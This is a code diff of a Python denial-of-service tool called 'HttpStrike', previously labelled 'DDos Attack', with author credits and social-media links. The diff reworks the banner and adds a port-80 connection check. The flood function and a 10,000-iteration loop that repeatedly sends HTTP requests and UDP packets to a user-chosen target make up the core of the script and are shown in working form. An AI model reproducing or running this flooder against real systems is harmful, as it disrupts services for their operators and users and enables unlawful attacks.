@@ -6,9 +6,15 @@ import time
 import socket
 import random
 import requests
+import pyfiglet
 
+# a packet must be crafted to send to port 80
+
+os.system("clear")
+banner = pyfiglet.figlet_format("HttpStrike")
+packet = ""
 useragent = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
-#Code Time
+
 from datetime import datetime
 now = datetime.now()
 hour = now.hour
@@ -16,16 +22,16 @@ minute = now.minute
 day = now.day
 month = now.month
 year = now.year
-##############
-os.system("clear")
-os.system("figlet DDos Attack")
-print
 
-print ("Author   : AngelDustSec")
-print ("You Tube :https://youtube.com/@Anonymous")
-print ("github   : https://github.com/K3ysTr0K3R")
-print ("Instagram : https://instagram.com/K3ysTr0K3R")
-print
+def start():
+    os.system("clear")
+    print(banner)
+print("")
+print("Security-Team    : AngelDustSec")
+print("YouTube          : https://youtube.com/@Anonymous")
+print("GitHub           : https://github.com/K3ysTr0K3R")
+print("Instagram        : https://instagram.com/K3ysTr0K3R")
+print("")
 
 def flood(target):
     req = requests.get(f"http://{target}:80/", headers=useragent)
@@ -34,21 +40,30 @@ def flood(target):
     sock.sendto(req.content, (target, 80))
     sock.close()
 
-target = input("!!!!...target = ")
-os.system("clear")
-os.system("figlet Attack Starting")
-print ("[                    ] 0% ")
-time.sleep(1)
-print ("[=====               ] 25%")
-time.sleep(3)
-print ("[==========          ] 50%")
-time.sleep(2)
-print ("[===============     ] 75%")
-time.sleep(2)
-print ("[====================] 100%")
-time.sleep(1)
-sent = 0
+target = input("[!] target? = ")
+print(f"[i] Scan started at [{hour}:{minute}:{day}/{month}/{year}]")
+try:
+    start()
+    time.sleep(0.5)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connect = sock.connect_ex((target, 80))
+    if connect == 0:
+        print(f"[!] Connected to [{target}:80]")
+    else:
+        print(f"[i] {target}:80 is closed")
+        exit()
+except KeyboardInterrupt :
+    print("\n[i] user requested interrupt")
+    print("[i] shutting down...")
+    exit()
+except socket.gaierror :
+    print("[!] hostname not found")
+    exit()
+except socket.error :
+    print("[!] could not connect to server")
+    exit()
 
+print("")
 for _ in range(1,10000):
-    flood(target) # calling the function/starting flood in for loop
-    print(f"[+] Flooding {target} on port 80 for {_} seconds")
+    flood(target)
+    print(f"[+] Flooding {target} on port 80 for {_} seconds [{hour}:{minute}:{day}/{month}/{year}]")
